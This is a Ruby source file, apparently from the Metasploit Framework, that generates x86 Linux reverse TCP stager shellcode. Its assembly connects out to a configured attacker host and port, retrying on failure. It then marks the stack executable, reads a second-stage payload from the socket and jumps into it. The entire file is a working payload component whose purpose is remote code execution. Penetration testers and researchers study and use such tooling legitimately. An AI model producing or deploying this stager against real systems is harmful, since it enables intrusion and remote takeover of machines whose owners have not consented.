# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/linux'
require 'msf/core/payload/linux/send_uuid'

module Msf


###
#
# Complex reverse TCP payload generation for Linux ARCH_X86
#
###


module Payload::Linux::ReverseTcp

  include Msf::Payload::TransportConfig
  include Msf::Payload::Linux
  include Msf::Payload::Linux::SendUUID

  #
  # Generate the first stage
  #
  def generate
    conf = {
      port:              datastore['LPORT'],
      host:              datastore['LHOST'],
      retry_count:       datastore['ReverseConnectRetries'],
      stager_retry_wait: datastore['StagerRetryWait'],
      sleep_nanoseconds: datastore['SleepNanoseconds'],
      reliable:    false
    }

    # Generate the advanced stager if we have space
    if self.available_space && required_space <= self.available_space
      conf[:exitfunk] = datastore['EXITFUNC']
      conf[:reliable] = true
    end

    generate_reverse_tcp(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  def transport_config(opts={})
    transport_config_reverse_tcp(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_tcp(opts={})
    asm = asm_reverse_tcp(opts)
    buf = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
    apply_prepends(buf)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = 300

    # Reliability adds 10 bytes for recv error checks
    space += 10

    # The final estimated size
    space
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :host The host IP to connect to
  # @option opts [Bool] :reliable Whether or not to enable error handling code
  #
  def asm_reverse_tcp(opts={})
    # TODO: reliability is coming
    retry_count  = opts[:retry_count]
    reliable     = opts[:reliable]
    encoded_port = "0x%.8x" % [opts[:port].to_i, 2].pack("vn").unpack("N").first
    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
    stager_retry_wait = (opts[:stager_retry_wait] || 5).to_i

    asm = %Q^
        push #{retry_count}        ; retry counter
        pop esi
      create_socket:
        xor ebx, ebx
        mul ebx
        push ebx
        inc ebx
        push ebx
        push 0x2
        mov al, 0x66
        mov ecx, esp
        int 0x80                   ; sys_socketcall (socket())
        xchg eax, edi              ; store the socket in edi

      set_address:
        pop ebx                    ; set ebx back to zero
        push #{encoded_host}
        push #{encoded_port}
        mov ecx, esp

      try_connect:
        push 0x66
        pop eax
        push eax
        push ecx
        push edi
        mov ecx, esp
        inc ebx
        int 0x80                   ; sys_socketcall (connect())
        test eax, eax
        jns mprotect

      handle_failure:
        push 0xa2
        pop eax
        push 0                     ; nanoseconds
        push #{stager_retry_wait}  ; seconds
        mov ebx, esp
        xor ecx, ecx
        int 0x80                   ; sys_nanosleep
        test eax, eax
        js failed
        dec esi
        jnz create_socket
        jmp failed
    ^

    asm << asm_send_uuid if include_send_uuid

    asm << %Q^
      mprotect:
        mov dl, 0x7
        mov ecx, 0x1000
        mov ebx, esp
        shr ebx, 0xc
        shl ebx, 0xc
        mov al, 0x7d
        int 0x80                  ; sys_mprotect
        test eax, eax
        js failed

      recv:
        pop ebx
        mov ecx, esp
        cdq
        mov dh, 0xc
        mov al, 0x3
        int 0x80                  ; sys_read (recv())
        test eax, eax
        js failed
        jmp ecx

      failed:
        mov eax, 0x1
        mov ebx, 0x1              ; set exit status to 1
        int 0x80                  ; sys_exit
    ^

    asm
  end

end

end
